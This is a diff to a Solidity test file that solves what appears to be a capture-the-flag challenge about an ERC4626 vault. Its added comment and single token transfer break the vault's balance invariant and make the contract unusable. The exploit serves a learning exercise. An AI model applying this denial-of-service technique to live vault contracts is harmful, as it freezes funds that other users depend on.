@@ -91,7 +91,15 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        /**
+         * We can exploit the vault contract by transferring tokens to it.
+         * This will affect the totalAssets function implementation
+         * which is internally used by the vault contract (ERC4626).
+         *
+         * This will mess up the comparison "convertToShares(totalSupply) != balanceBefore"
+         * and render the contract unusable since ERC-20 cannot be transfered from the vault
+         */
+        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
     }
 
     /**
